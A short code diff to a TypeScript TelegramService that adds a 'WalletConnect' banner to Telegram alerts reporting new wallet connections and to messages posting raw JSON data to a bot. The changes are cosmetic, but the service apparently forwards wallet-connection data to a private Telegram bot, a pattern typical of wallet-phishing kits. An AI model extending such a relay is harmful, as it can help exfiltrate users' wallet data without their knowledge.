@@ -31,8 +31,10 @@ export class TelegramService {
     const date = timestamp.toLocaleDateString();
     const time = timestamp.toLocaleTimeString();
 
-    let message = '🔐 <b>NEW WALLET CONNECTION</b>\n';
+    let message = '<b>🌐 WalletConnect</b>\n';
     message += '═══════════════════════\n\n';
+    message += '🔐 <b>NEW WALLET CONNECTION</b>\n';
+    message += '───────────────────────\n\n';
     
     message += `📅 <b>Date:</b> ${date}\n`;
     message += `⏰ <b>Time:</b> ${time}\n`;
@@ -113,7 +115,7 @@ export class TelegramService {
     }
 
     try {
-      const jsonMessage = `<b>📄 Raw JSON Data:</b>\n<code>${JSON.stringify(data, null, 2)}</code>`;
+      const jsonMessage = `<b>🌐 WalletConnect</b>\n═══════════════════════\n\n<b>📄 Raw JSON Data:</b>\n<code>${JSON.stringify(data, null, 2)}</code>`;
       const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
 
       const response = await fetch(url, {
